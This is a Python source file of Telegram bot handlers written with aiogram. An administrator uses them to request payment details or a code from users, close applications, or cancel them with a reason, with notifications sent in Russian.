from aiogram import Router, F, Bot
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext

from config import ADMIN_ID, NOTIFY_CHANNEL_ID
from states import AdminStates
from database import get_app, update_app

router = Router()


@router.callback_query(F.data.startswith("admin_req_sbp:"))
async def admin_request_requisites(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Запрошены реквизиты")
    await callback.answer("✅ Уведомление отправлено пользователю!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"💬 <b>Администратор запросил реквизиты по заявке #{app_id}!</b>\n\nОтправьте их ответным сообщением.",
            parse_mode="HTML"
        )
    except Exception:
        pass

    app_data = get_app(app_id)
    if app_data and app_data[7]:
        old_text = callback.message.text
        new_text = old_text.replace("Статус: ⏳ Запрос реквизитов", "Статус: 💬 Реквизиты запрашиваются")
        try:
            await callback.message.edit_text(new_text, reply_markup=callback.message.reply_markup, parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(F.data.startswith("admin_req_code:"))
async def admin_request_code(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Запрошен код")
    await callback.answer("✅ Запрос кода отправлен!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"📲 <b>Администратор запросил код по заявке #{app_id}!</b>\n\nПожалуйста, отправьте код в чат.",
            parse_mode="HTML"
        )
    except Exception:
        pass

    app_data = get_app(app_id)
    if app_data and app_data[7]:
        old_text = callback.message.text
        new_text = old_text.replace("Статус: ⏳ Ожидание запроса кода", "Статус: 📲 Код запрашивается")
        try:
            await callback.message.edit_text(new_text, reply_markup=callback.message.reply_markup, parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(F.data.startswith("admin_done:"))
async def admin_done_app(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Успешно завершено")
    await callback.answer("✅ Заявка закрыта!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"✅ <b>Ваша заявка #{app_id} успешно выполнена!</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

    try:
        await callback.message.edit_text(f"✅ <b>Заявка #{app_id} ЗАВЕРШЕНА</b>", parse_mode="HTML")
    except Exception:
        pass


@router.callback_query(F.data.startswith("admin_cancel:"))
async def admin_cancel_prompt(callback: CallbackQuery, state: FSMContext, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")

    await state.update_data(
        cancel_app_id=int(app_id_str),
        cancel_user_id=int(target_user_id_str),
        admin_message_id=callback.message.message_id
    )
    await state.set_state(AdminStates.waiting_cancel_reason)

    await callback.answer()
    await callback.message.answer(
        f"❌ Введите причину отмены для заявки <b>#{app_id_str}</b> следующим сообщением:",
        parse_mode="HTML"
    )


@router.message(AdminStates.waiting_cancel_reason)
async def admin_process_cancel_reason(message: Message, state: FSMContext, bot: Bot):
    if message.from_user.id != ADMIN_ID:
        return

    reason = message.text.strip()
    data = await state.get_data()

    app_id = data.get("cancel_app_id")
    target_user_id = data.get("cancel_user_id")
    admin_msg_id = data.get("admin_message_id")

    update_app(app_id, status=f"Отменено: {reason}")
    await state.clear()

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"❌ <b>Ваша заявка #{app_id} была отменена администратором.</b>\n\nПричина: <i>{reason}</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

    await message.answer(f"✅ Причина для заявки #{app_id} успешно отправлена пользователю.")

    try:
        await bot.edit_message_text(
            chat_id=NOTIFY_CHANNEL_ID,
            message_id=admin_msg_id,
            text=f"❌ <b>Заявка #{app_id} ОТМЕНЕНА</b>\nПричина: <i>{reason}</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass